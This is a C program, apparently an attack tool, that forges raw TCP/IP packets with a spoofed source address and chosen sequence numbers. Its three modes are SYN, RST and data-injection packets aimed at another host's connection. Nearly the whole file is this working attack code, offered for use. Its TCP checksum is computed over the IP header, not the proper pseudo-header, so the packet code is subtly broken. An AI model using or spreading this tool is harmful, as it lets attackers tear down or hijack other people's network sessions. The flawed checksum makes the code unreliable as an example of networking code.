#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>

unsigned short csum(unsigned short *buf, int nwords){
    unsigned long sum;
    for(sum=0; nwords>0; nwords--) sum += *buf++;
    while(sum>>16) sum=(sum>>16)+(sum&0xffff);
    return (unsigned short)(~sum);
}

void make_tcp_packet(char *packet, char *src_ip, int src_port,
                     char *dst_ip, int dst_port,
                     unsigned int seq, unsigned int ack,
                     char flags, char *payload) {
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    int payload_len = payload ? strlen(payload) : 0;
    memset(packet, 0, 4096);

    ip->ihl = 5;
    ip->version = 4;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = inet_addr(src_ip);
    ip->daddr = inet_addr(dst_ip);
    ip->check = csum((unsigned short *)ip, ip->ihl*2);

    tcp->source = htons(src_port);
    tcp->dest = htons(dst_port);
    tcp->seq = htonl(seq);
    tcp->ack_seq = htonl(ack);
    tcp->doff = 5;
    tcp->window = htons(65535);

    // set flag bits
    if(flags=='S') tcp->syn=1;
    if(flags=='R') tcp->rst=1;
    if(flags=='D'){ tcp->psh=1; tcp->ack=1; }

    if(payload_len) memcpy(packet + sizeof(struct iphdr) + sizeof(struct tcphdr), payload, payload_len);
    tcp->check = csum((unsigned short *)packet, (sizeof(struct iphdr)+sizeof(struct tcphdr)+payload_len)/2);
}

int main(int argc, char *argv[]){
    if(argc < 8){
        printf("Usage: sudo ./attack <type:S|R|D> <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack> [payload]\n");
        return 1;
    }
    char type = argv[1][0];
    char *src_ip = argv[2];
    int src_port = atoi(argv[3]);
    char *dst_ip = argv[4];
    int dst_port = atoi(argv[5]);
    unsigned int seq = atoi(argv[6]);
    unsigned int ack = atoi(argv[7]);
    char *payload = (argc==9)? argv[8] : "";

    char packet[4096];
    make_tcp_packet(packet, src_ip, src_port, dst_ip, dst_port, seq, ack, type, payload);

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int one=1; setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    struct sockaddr_in sin; sin.sin_family=AF_INET; sin.sin_addr.s_addr=inet_addr(dst_ip);

    sendto(s, packet, ntohs(((struct iphdr *)packet)->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
    printf("Sent %c attack packet from %s:%d to %s:%d\n", type, src_ip, src_port, dst_ip, dst_port);
    close(s);
    return 0;
}
